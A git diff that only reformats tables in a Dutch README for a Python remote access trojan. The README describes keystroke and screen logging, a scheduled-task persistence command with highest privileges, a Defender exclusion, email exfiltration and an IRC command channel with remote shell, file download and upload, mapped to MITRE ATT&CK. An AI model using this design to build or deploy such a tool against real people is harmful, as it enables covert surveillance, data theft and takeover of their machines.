@@ -86,23 +86,23 @@ Het script leest dit bestand met `read_secrets()`. Als een sleutel ontbreekt, wo
 
 ```json
 {
-    "TimeBetweenEachScreenshot": 300,
-    "LogKeys":                   true,
-    "LogScreen":                 true,
-    "Logging":                   true,
-    "EnableKillSwitch":          true,
-    "persistentMailInterval":    120
+  "TimeBetweenEachScreenshot": 300,
+  "LogKeys": true,
+  "LogScreen": true,
+  "Logging": true,
+  "EnableKillSwitch": true,
+  "persistentMailInterval": 120
 }
 ```
 
-| Parameter                  | Beschrijving                                              | Standaard |
-|---------------------------|-----------------------------------------------------------|-----------|
+| Parameter                   | Beschrijving                                            | Standaard   |
+| --------------------------- | ------------------------------------------------------- | ----------- |
 | `TimeBetweenEachScreenshot` | Seconden tussen twee screenshots                        | 300 (5 min) |
-| `LogKeys`                  | Keylogger aan/uit                                        | `true` |
-| `LogScreen`                | Schermopname aan/uit                                     | `true` |
-| `Logging`                  | Algemene schakelaar (overschrijft de twee bovenstaande)  | `true` |
-| `EnableKillSwitch`         | Ctrl+Alt+K killswitch inschakelen                        | `true` |
-| `persistentMailInterval`   | Seconden tussen mailpogingen                             | 120 (2 min) |
+| `LogKeys`                   | Keylogger aan/uit                                       | `true`      |
+| `LogScreen`                 | Schermopname aan/uit                                    | `true`      |
+| `Logging`                   | Algemene schakelaar (overschrijft de twee bovenstaande) | `true`      |
+| `EnableKillSwitch`          | Ctrl+Alt+K killswitch inschakelen                       | `true`      |
+| `persistentMailInterval`    | Seconden tussen mailpogingen                            | 120 (2 min) |
 
 ---
 
@@ -162,11 +162,11 @@ Main Thread
 
 **Gedeelde toestand en synchronisatie:**
 
-| Gedeelde variabele | Beschermd door | Beschrijving |
-|---|---|---|
-| `keylog.txt` (bestand) | `logLock` | Zowel KeyLogger als ScreenLogger schrijven erin |
-| `logKeys`, `logScreen`, `logging` | geen lock nodig (GIL) | Worden gelezen/geschreven als simpele booleans |
-| `screenshotCount` | `logLock` bij schrijven | Integer, gelezen door C2Agent via `!status` |
+| Gedeelde variabele                | Beschermd door          | Beschrijving                                    |
+| --------------------------------- | ----------------------- | ----------------------------------------------- |
+| `keylog.txt` (bestand)            | `logLock`               | Zowel KeyLogger als ScreenLogger schrijven erin |
+| `logKeys`, `logScreen`, `logging` | geen lock nodig (GIL)   | Worden gelezen/geschreven als simpele booleans  |
+| `screenshotCount`                 | `logLock` bij schrijven | Integer, gelezen door C2Agent via `!status`     |
 
 ---
 
@@ -214,11 +214,11 @@ schtasks /create /sc ONLOGON /tn s142486_Worm
          /rl highest /F
 ```
 
-| Vlag | Betekenis |
-|------|-----------|
-| `/sc ONLOGON` | Taak wordt uitgevoerd bij elke inlog |
-| `/rl highest` | Hoogste rechten (UAC-niveau) |
-| `/F` | Overschrijf eventuele bestaande taak met dezelfde naam |
+| Vlag          | Betekenis                                              |
+| ------------- | ------------------------------------------------------ |
+| `/sc ONLOGON` | Taak wordt uitgevoerd bij elke inlog                   |
+| `/rl highest` | Hoogste rechten (UAC-niveau)                           |
+| `/F`          | Overschrijf eventuele bestaande taak met dezelfde naam |
 
 Daarna past het via PowerShell de taakinstellingen aan zodat de taak ook op batterijstroom start en niet gestopt wordt als de batterij laag is (`AllowStartIfOnBatteries`, `DontStopIfGoingOnBatteries`).
 
@@ -297,7 +297,7 @@ Na elke screenshot wordt ook een markering in `keylog.txt` geschreven:
 
 Hierdoor kan je in de keylog zien wat de gebruiker aan het typen was op het moment van een screenshot, en vice versa.
 
-**Live toggling:** de `if not (logScreen and logging)` check staat *binnen* de while-lus. Als de C2-operator `!spy screen off` stuurt, pauzeert de thread na maximaal 5 seconden (de `exitEvent.wait(5)` in de pauze-branch). Schermopnames worden hervat zodra `!spy screen on` verstuurd wordt.
+**Live toggling:** de `if not (logScreen and logging)` check staat _binnen_ de while-lus. Als de C2-operator `!spy screen off` stuurt, pauzeert de thread na maximaal 5 seconden (de `exitEvent.wait(5)` in de pauze-branch). Schermopnames worden hervat zodra `!spy screen on` verstuurd wordt.
 
 ---
 
@@ -305,13 +305,13 @@ Hierdoor kan je in de keylog zien wat de gebruiker aan het typen was op het mome
 
 Logt elke toetsaanslag naar `keylog.txt`. Speciale toetsen worden omgezet naar leesbare labels via `key_map`:
 
-| Toets | Gelogd als |
-|-------|-----------|
-| Spatiebalk | (spatie) |
-| Enter | ` ENTER` + nieuwe regel |
-| Backspace | ` *BACKSPACE* ` |
-| Ctrl | ` *CTRL* ` |
-| Pijltjes | ` *ARROW_UP* ` etc. |
+| Toets      | Gelogd als              |
+| ---------- | ----------------------- |
+| Spatiebalk | (spatie)                |
+| Enter      | ` ENTER` + nieuwe regel |
+| Backspace  | `*BACKSPACE*`           |
+| Ctrl       | `*CTRL*`                |
+| Pijltjes   | `*ARROW_UP*` etc.       |
 
 Na elke Enter wordt de huidige tijd toegevoegd (`<<HH:MM>>`), waardoor je in de log kan zien wanneer de gebruiker iets bevestigd heeft.
 
@@ -338,12 +338,14 @@ De IRC C2-agent. Werking stap voor stap:
 2. **Verbind** met de IRC-server via een TCP socket (`socket.AF_INET`).
 
 3. **Identificeer** met het IRC-protocol:
+
    ```
    NICK bot_<gebruikersnaam>
    USER bot_<gebruikersnaam> 0 * :bot_<gebruikersnaam>
    ```
 
 4. **Wacht op welkomstbericht** (numerieke code `001`) en joint dan het kanaal:
+
    ```
    JOIN #c2
    ```
@@ -376,16 +378,16 @@ Kan uitgeschakeld worden via `EnableKillSwitch: false` in `Params.json`.
 
 De operator typt deze commando's in `C2Server.py`. Ze worden via IRC naar de agent gestuurd.
 
-| Commando | Beschrijving | Voorbeeld |
-|----------|-------------|---------|
-| `!shell <cmd>` | Voer een shell-commando uit op het doel | `!shell whoami` |
-| `!download <pad>` | Ontvang een bestand als base64 | `!download C:\Windows\System32\drivers\etc\hosts` |
-| `!upload <pad> <base64>` | Schrijf een bestand naar het doel | `!upload C:\temp\test.txt SGVsbG8=` |
-| `!spy keylog on\|off` | Keylogger aan/uit | `!spy keylog off` |
-| `!spy screen on\|off` | Schermopname aan/uit | `!spy screen on` |
-| `!spy mail on\|off` | E-mail exfiltratie aan/uit | `!spy mail off` |
-| `!status` | Toon hostname en huidige instellingen | `!status` |
-| `!help` | Toon commando-overzicht | `!help` |
+| Commando                 | Beschrijving                            | Voorbeeld                                         |
+| ------------------------ | --------------------------------------- | ------------------------------------------------- |
+| `!shell <cmd>`           | Voer een shell-commando uit op het doel | `!shell whoami`                                   |
+| `!download <pad>`        | Ontvang een bestand als base64          | `!download C:\Windows\System32\drivers\etc\hosts` |
+| `!upload <pad> <base64>` | Schrijf een bestand naar het doel       | `!upload C:\temp\test.txt SGVsbG8=`               |
+| `!spy keylog on\|off`    | Keylogger aan/uit                       | `!spy keylog off`                                 |
+| `!spy screen on\|off`    | Schermopname aan/uit                    | `!spy screen on`                                  |
+| `!spy mail on\|off`      | E-mail exfiltratie aan/uit              | `!spy mail off`                                   |
+| `!status`                | Toon hostname en huidige instellingen   | `!status`                                         |
+| `!help`                  | Toon commando-overzicht                 | `!help`                                           |
 
 **Bestandsoverdracht (`!download`):**  
 Bestanden worden als base64-string teruggestuurd met het formaat `FILE:<naam>:<base64>`. In `C2Server.py` kan je het ontvangen bestand opslaan door `save <bestandsnaam>` te typen.
@@ -446,18 +448,18 @@ sendSingleMail()             ← SMTP STARTTLS naar smtp.gmail.com:587
 
 ## 9. Gebruikte technieken en MITRE ATT&CK mapping
 
-| Techniek | Functie in RAT.pyw | MITRE ATT&CK |
-|---|---|---|
-| Persistence via Task Scheduler | `runOnLogin()` | T1053.005 — Scheduled Task |
-| Verborgen map | `makeStructure()` + `attrib +h` | T1564.001 — Hidden Files |
-| Zelf-kopiëren | `copyScript()` | T1105 — Ingress Tool Transfer |
-| Keylogging | `keyLogger()` | T1056.001 — Keylogging |
-| Schermopname | `screenLogger()` | T1113 — Screen Capture |
-| Exfiltratie via e-mail | `mailQueue()` / `sendSingleMail()` | T1048.003 — Exfiltration Over Unencrypted Protocol |
-| AV-uitsluiting | `add_defender_exclusion()` | T1562.001 — Disable or Modify Tools |
-| C2 via IRC | `c2Agent()` | T1071.003 — Application Layer Protocol: IRC |
-| Remote shell | `handle_c2_command()` → `!shell` | T1059 — Command and Scripting Interpreter |
-| Bestandsoverdracht via C2 | `!download` / `!upload` | T1105 — Ingress Tool Transfer |
+| Techniek                       | Functie in RAT.pyw                 | MITRE ATT&CK                                       |
+| ------------------------------ | ---------------------------------- | -------------------------------------------------- |
+| Persistence via Task Scheduler | `runOnLogin()`                     | T1053.005 — Scheduled Task                         |
+| Verborgen map                  | `makeStructure()` + `attrib +h`    | T1564.001 — Hidden Files                           |
+| Zelf-kopiëren                  | `copyScript()`                     | T1105 — Ingress Tool Transfer                      |
+| Keylogging                     | `keyLogger()`                      | T1056.001 — Keylogging                             |
+| Schermopname                   | `screenLogger()`                   | T1113 — Screen Capture                             |
+| Exfiltratie via e-mail         | `mailQueue()` / `sendSingleMail()` | T1048.003 — Exfiltration Over Unencrypted Protocol |
+| AV-uitsluiting                 | `add_defender_exclusion()`         | T1562.001 — Disable or Modify Tools                |
+| C2 via IRC                     | `c2Agent()`                        | T1071.003 — Application Layer Protocol: IRC        |
+| Remote shell                   | `handle_c2_command()` → `!shell`   | T1059 — Command and Scripting Interpreter          |
+| Bestandsoverdracht via C2      | `!download` / `!upload`            | T1105 — Ingress Tool Transfer                      |
 
 ---
 
